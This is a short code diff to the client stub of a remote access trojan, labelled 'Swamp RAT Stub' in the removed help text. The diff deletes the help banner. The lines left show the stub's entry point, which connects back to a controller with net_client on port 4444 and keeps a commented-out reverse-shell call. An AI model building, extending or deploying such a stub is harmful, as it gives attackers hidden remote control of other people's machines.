@@ -18,12 +18,7 @@
 #include <stdio.h>
 #include <string.h>
 #include "include/stub/net.h"
-void help_menu(){
-  printf("Swamp RAT Stub!\n");
-}
-
 int main(){
-  help_menu();
   //shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
   //printf("breakpoints: %d\n", re_breakpoints());
   net_client("127.0.0.1", 4444);
